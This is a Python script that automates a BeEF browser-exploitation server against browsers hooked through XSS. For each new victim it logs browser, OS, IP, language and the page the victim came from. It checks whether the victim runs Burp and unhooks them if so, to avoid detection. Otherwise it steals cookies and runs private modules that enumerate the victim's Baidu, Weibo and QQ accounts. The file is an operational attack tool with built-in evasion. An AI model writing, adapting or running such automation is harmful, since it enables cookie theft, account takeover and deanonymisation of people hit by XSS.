import json
import time
import _thread
from beef import *

#Connect to beef server
beef=beefhandle('username','password')
#Count of machine
Count=0
#commands list
commands=list()
def FetchCommandsResult():
    while True:
        for (sessionid,moduleid,commandid,id,modulename) in commands:
            time.sleep(0.5)
            result=beef.GetCommandResult(sessionid,moduleid,commandid)
            if not result:
                continue
            print("[+] 获取到{id}号session的{modulename}命令的返回结果:{result}".format(id=id,modulename=modulename,result=result))
            commands.remove( list( (sessionid,moduleid,commandid,id,modulename) ) )

def ExecuteCommandBackground(sessionid,modulename,id):
    command=beef.ExecuteCommand(sessionid,modulename,wait=False)
    command.append(id)
    command.append(modulename)
    commands.append(command)

def Handle(sessionid,id):
    id=str(id)
    basicinfo=beef.GetBrowserDetail(sessionid)
    words='\n'+'-'*30+"\n[+]有新的主机中了XSS，请查收"+"\n[*]User-Agent："+basicinfo['browser.name.reported']+"\n[*]平台："+basicinfo['host.os.name']+"\n[*]IP："+basicinfo['host.ipaddress']+"\n[*]来路："+basicinfo["browser.window.uri"]+"\n[*]使用语言："+basicinfo['browser.language']+"\n[*]当前会话ID："+sessionid+"\n[*]当前主机会话编号："+id
    print(words)
    print(id+"号会话开始检测Burp")
    result=beef.ExecuteCommand(sessionid,"Detect Burp",timeout=30)
    if  result and 'true' in result:
        print("[-]危险，"+id+"号会话发现Burp，行动可能已暴露,解除hook状态")
        beef.ExecuteCommand(sessionid,'Unhook',wait=False)
    else:
        print('[*]未在'+id+"号会话发现Burp,可继续操作")
        print(id+"号会话开始获取cookies")
        ExecuteCommandBackground(sessionid,"Get Cookie",id)
        #my PRIVATE module that was NOT included in beef so please modify  the code yourself 
        print(id+"号会话开始探测各类社交帐号")
        print(id+"号会话开始探测百度帐号")
        ExecuteCommandBackground(sessionid,"get Baidu account",id)
        print(id+"号会话开始探测微博帐号")
        ExecuteCommandBackground(sessionid,"get Weibo uid",id)
        print(id+"号会话开始探测qq帐号")
        ExecuteCommandBackground(sessionid,"get qq  userlink",id)

_thread.start_new_thread(FetchCommandsResult,())
browsers=set()
while True:
    time.sleep(2)
    current=set(beef.GetOnlineBrowsers(False))
    newsessions=current-browsers
    for sessionid in newsessions:
        Count+=1
        _thread.start_new_thread(Handle,(sessionid,Count))
    browsers=current